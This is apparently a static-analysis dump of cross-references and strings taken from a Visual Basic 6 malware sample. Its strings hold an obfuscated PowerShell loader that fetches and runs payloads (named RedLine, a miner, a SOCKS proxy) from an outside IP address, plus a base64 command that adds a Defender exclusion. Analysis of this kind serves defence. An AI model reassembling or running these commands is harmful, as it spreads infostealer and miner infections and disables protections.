reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x4012f2	0x401098	import	0x4012f2	MSVBVM60.DLL.ThunRTMain
0x4012f8	0x4013d0	string	0x4012f2	VB5!
0x40235a	0x40235c	string	0x4012f2	tps://maper.info/XIUaT
0x4024d6	0x4024d8	string	0x4012f2	__vbaStrMove
0x402522	0x402524	string	0x4012f2	__vbaVarAdd
0x40256a	0x4025d1	string	0x4012f2	`ӓForm blocks=Basic Latin,Cyrillic
0x40389c	0x4018b0	string	0x403850	W{YESS}{YESS}Sc{YESS}{YESS}r{YESS}{YESS}ip{YESS}t.Sh{YESS}{YESS}e{YESS}{YESS}l{YESS}l
0x4038b9	0x4010ac	import	0x403850	MSVBVM60.DLL.__vbaVarCopy
0x4038e1	0x401078	import	0x403850	MSVBVM60.DLL.__vbaStrVarVal
0x4038e8	0x401064	import	0x403850	MSVBVM60.DLL.rtcReplace
0x403907	0x401008	import	0x403850	MSVBVM60.DLL.__vbaVarMove
0x403913	0x4010cc	import	0x403850	MSVBVM60.DLL.__vbaFreeStr
0x40392d	0x401078	import	0x403850	MSVBVM60.DLL.__vbaStrVarVal
0x40393b	0x401070	import	0x403850	MSVBVM60.DLL.rtcCreateObject2
0x40394f	0x40109c	import	0x403850	MSVBVM60.DLL.__vbaVarSetVar
0x40395b	0x4010cc	import	0x403850	MSVBVM60.DLL.__vbaFreeStr
0x403968	0x401a10	string	0x403850	p{YESS}{YESS}o{YESS}{YESS}we{YESS}{YESS}rs{YESS}{YESS}he{YESS}{YESS}l{YESS}{YESS}l
0x403985	0x4010ac	import	0x403850	MSVBVM60.DLL.__vbaVarCopy
0x403992	0x401abc	string	0x403850	$c1='{YESS}(N{YESS}{YESS}e{YESS}w-{YESS}Ob{YESS}{YESS}je{YESS}{YESS}c{YESS}t N{YESS}{YESS}e{YESS}t.W{YESS}e';
0x4039b2	0x4010ac	import	0x403850	MSVBVM60.DLL.__vbaVarCopy
0x4039bf	0x401bf4	string	0x403850	$c4='b{YESS}{YESS}Cli{YESS}{YESS}en{YESS}{YESS}t{YESS}).Do{YESS}{YESS}wn{YESS}{YESS}l{YESS}o';
0x4039df	0x4010ac	import	0x403850	MSVBVM60.DLL.__vbaVarCopy
0x4039ec	0x401cb8	string	0x403850	$c3='a{YESS}dS{YESS}{YESS}t{YESS}ri{YESS}{YESS}n{YESS}g{YESS}(''h{YESS}tt{YESS}p:/{YESS}/31.41.244.231/0x?0=RedLine''){YESS}';
0x403a0c	0x4010ac	import	0x403850	MSVBVM60.DLL.__vbaVarCopy
0x403a19	0x401ddc	string	0x403850	$c3='a{YESS}dS{YESS}{YESS}t{YESS}ri{YESS}{YESS}n{YESS}g{YESS}(''h{YESS}tt{YESS}p:/{YESS}/31.41.244.231/0xMine/RegAsm.go''){YESS}';
0x403a39	0x4010ac	import	0x403850	MSVBVM60.DLL.__vbaVarCopy
0x403a46	0x401fcc	string	0x403850	$c3='a{YESS}dS{YESS}{YESS}t{YESS}ri{YESS}{YESS}n{YESS}g{YESS}(''h{YESS}tt{YESS}p:/{YESS}/31.41.244.231/0xMine/go.go''){YESS}';
0x403a66	0x4010ac	import	0x403850	MSVBVM60.DLL.__vbaVarCopy
0x403a73	0x4021b8	string	0x403850	$c3='a{YESS}dS{YESS}{YESS}t{YESS}ri{YESS}{YESS}n{YESS}g{YESS}(''h{YESS}tt{YESS}p:/{YESS}/31.41.244.231/0xSocks/go.go''){YESS}';
0x403a93	0x4010ac	import	0x403850	MSVBVM60.DLL.__vbaVarCopy
0x403ac0	0x4010ac	import	0x403850	MSVBVM60.DLL.__vbaVarCopy
0x403aed	0x4010ac	import	0x403850	MSVBVM60.DLL.__vbaVarCopy
0x403afa	0x402338	string	0x403850	IEX $TC |IEX
0x403b1a	0x4010ac	import	0x403850	MSVBVM60.DLL.__vbaVarCopy
0x403b42	0x401078	import	0x403850	MSVBVM60.DLL.__vbaStrVarVal
0x403b49	0x401064	import	0x403850	MSVBVM60.DLL.rtcReplace
0x403b68	0x401008	import	0x403850	MSVBVM60.DLL.__vbaVarMove
0x403b74	0x4010cc	import	0x403850	MSVBVM60.DLL.__vbaFreeStr
0x403b81	0x4020d0	string	0x403850	-enc IABBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJABlAG4AdgA6AFUAUwB
0x403ba1	0x4010ac	import	0x403850	MSVBVM60.DLL.__vbaVarCopy
0x403bae	0x401ee8	string	0x403850	FAFIAUABSAE8ARgBJAEwARQAnAFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAJwAgACAALQBGAG8AcgBjAGUAOwA=
0x403bcb	0x4010ac	import	0x403850	MSVBVM60.DLL.__vbaVarCopy
0x403bda	0x40102c	import	0x403850	MSVBVM60.DLL.__vbaOnError
0x403c21	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403c33	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403c48	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403caf	0x401048	import	0x403850	MSVBVM60.DLL.__vbaObjVar
0x403cb6	0x4010a0	import	0x403850	MSVBVM60.DLL.__vbaLateMemCall
0x403cd6	0x401010	import	0x403850	MSVBVM60.DLL.__vbaFreeVarList
0x403cfb	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403d10	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403d25	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403d3a	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403d4f	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403d5a	0x401008	import	0x403850	MSVBVM60.DLL.__vbaVarMove
0x403d7e	0x401010	import	0x403850	MSVBVM60.DLL.__vbaFreeVarList
0x403dc5	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403dda	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403e41	0x401048	import	0x403850	MSVBVM60.DLL.__vbaObjVar
0x403e48	0x4010a0	import	0x403850	MSVBVM60.DLL.__vbaLateMemCall
0x403e61	0x401010	import	0x403850	MSVBVM60.DLL.__vbaFreeVarList
0x403e86	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403e9b	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403eb0	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403ec5	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403eda	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403ee8	0x401008	import	0x403850	MSVBVM60.DLL.__vbaVarMove
0x403f0c	0x401010	import	0x403850	MSVBVM60.DLL.__vbaFreeVarList
0x403f56	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403f6b	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x403fd2	0x401048	import	0x403850	MSVBVM60.DLL.__vbaObjVar
0x403fd9	0x4010a0	import	0x403850	MSVBVM60.DLL.__vbaLateMemCall
0x403ff2	0x401010	import	0x403850	MSVBVM60.DLL.__vbaFreeVarList
0x404017	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x40402c	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x404041	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x404056	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x40406b	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x404076	0x401008	import	0x403850	MSVBVM60.DLL.__vbaVarMove
0x40409a	0x401010	import	0x403850	MSVBVM60.DLL.__vbaFreeVarList
0x4040e1	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x4040f6	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x40415d	0x401048	import	0x403850	MSVBVM60.DLL.__vbaObjVar
0x404164	0x4010a0	import	0x403850	MSVBVM60.DLL.__vbaLateMemCall
0x40417d	0x401010	import	0x403850	MSVBVM60.DLL.__vbaFreeVarList
0x4041a2	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x4041b7	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x4041cc	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x4041e1	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x4041f6	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x404204	0x401008	import	0x403850	MSVBVM60.DLL.__vbaVarMove
0x404228	0x401010	import	0x403850	MSVBVM60.DLL.__vbaFreeVarList
0x404272	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x404287	0x4010a4	import	0x403850	MSVBVM60.DLL.__vbaVarAdd
0x4042ee	0x401048	import	0x403850	MSVBVM60.DLL.__vbaObjVar
0x4042f5	0x4010a0	import	0x403850	MSVBVM60.DLL.__vbaLateMemCall
0x40430e	0x401010	import	0x403850	MSVBVM60.DLL.__vbaFreeVarList
0x40433e	0x4010a8	import	0x403850	MSVBVM60.DLL.__vbaVarDup
0x404367	0x401010	import	0x403850	MSVBVM60.DLL.__vbaFreeVarList
0x404391	0x401080	import	0x403850	MSVBVM60.DLL.__vbaNew2
0x4043fa	0x401024	import	0x403850	MSVBVM60.DLL.__vbaHresultCheckObj
0x40445d	0x401024	import	0x403850	MSVBVM60.DLL.__vbaHresultCheckObj
0x404488	0x401080	import	0x403850	MSVBVM60.DLL.__vbaNew2
0x4044f1	0x401024	import	0x403850	MSVBVM60.DLL.__vbaHresultCheckObj
0x404554	0x401024	import	0x403850	MSVBVM60.DLL.__vbaHresultCheckObj
0x404578	0x401020	import	0x403850	MSVBVM60.DLL.__vbaStrCat
0x404586	0x4010bc	import	0x403850	MSVBVM60.DLL.__vbaStrMove
0x404592	0x401020	import	0x403850	MSVBVM60.DLL.__vbaStrCat
0x4045a0	0x4010bc	import	0x403850	MSVBVM60.DLL.__vbaStrMove
0x4045ae	0x401020	import	0x403850	MSVBVM60.DLL.__vbaStrCat
0x4045bc	0x4010bc	import	0x403850	MSVBVM60.DLL.__vbaStrMove
0x4045c8	0x401020	import	0x403850	MSVBVM60.DLL.__vbaStrCat
0x4045d6	0x4010bc	import	0x403850	MSVBVM60.DLL.__vbaStrMove
0x404601	0x40108c	import	0x403850	MSVBVM60.DLL.__vbaFreeStrList
0x40461a	0x401018	import	0x403850	MSVBVM60.DLL.__vbaFreeObjList
0x404636	0x401020	import	0x403850	MSVBVM60.DLL.__vbaStrCat
0x404644	0x4010bc	import	0x403850	MSVBVM60.DLL.__vbaStrMove
0x404650	0x401020	import	0x403850	MSVBVM60.DLL.__vbaStrCat
0x40466f	0x401054	import	0x403850	MSVBVM60.DLL.rtcShell
0x404681	0x4010cc	import	0x403850	MSVBVM60.DLL.__vbaFreeStr
0x40468d	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x4046c0	0x40108c	import	0x403850	MSVBVM60.DLL.__vbaFreeStrList
0x4046d9	0x401018	import	0x403850	MSVBVM60.DLL.__vbaFreeObjList
0x404707	0x401010	import	0x403850	MSVBVM60.DLL.__vbaFreeVarList
0x404714	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x40471d	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x404726	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x40472f	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x404738	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x404741	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x40474d	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x404759	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x404765	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x404771	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x40477d	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x404789	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x404795	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x4047a1	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x4047ad	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x4047b9	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x4047c5	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x4047d1	0x4010cc	import	0x403850	MSVBVM60.DLL.__vbaFreeStr
0x4047dd	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x4047e9	0x40100c	import	0x403850	MSVBVM60.DLL.__vbaFreeVar
0x40485e	0x40102c	import	0x404810	MSVBVM60.DLL.__vbaOnError
0x404876	0x401070	import	0x404810	MSVBVM60.DLL.rtcCreateObject2
0x404884	0x40109c	import	0x404810	MSVBVM60.DLL.__vbaVarSetVar
0x40497b	0x4023c4	string	0x404810	setTimeouts
0x404984	0x401048	import	0x404810	MSVBVM60.DLL.__vbaObjVar
0x40498b	0x4010a0	import	0x404810	MSVBVM60.DLL.__vbaLateMemCall
0x4049e4	0x401038	import	0x404810	MSVBVM60.DLL.__vbaVargVar
0x404a33	0x4023e8	string	0x404810	Open
0x404a3c	0x401048	import	0x404810	MSVBVM60.DLL.__vbaObjVar
0x404a43	0x4010a0	import	0x404810	MSVBVM60.DLL.__vbaLateMemCall
0x404a55	0x4023f4	string	0x404810	send
0x404a5e	0x401048	import	0x404810	MSVBVM60.DLL.__vbaObjVar
0x404a65	0x4010a0	import	0x404810	MSVBVM60.DLL.__vbaLateMemCall
0x404a77	0x402400	string	0x404810	responseText
0x404a84	0x4010b0	import	0x404810	MSVBVM60.DLL.__vbaVarLateMemCallLd
0x404a92	0x401008	import	0x404810	MSVBVM60.DLL.__vbaVarMove
0x404aa5	0x4010b4	import	0x404810	MSVBVM60.DLL.__vbaVarSetObjAddref
0x404abf	0x40100c	import	0x404810	MSVBVM60.DLL.__vbaFreeVar
0x404ac8	0x40100c	import	0x404810	MSVBVM60.DLL.__vbaFreeVar
0x404ad2	0x40100c	import	0x404810	MSVBVM60.DLL.__vbaFreeVar
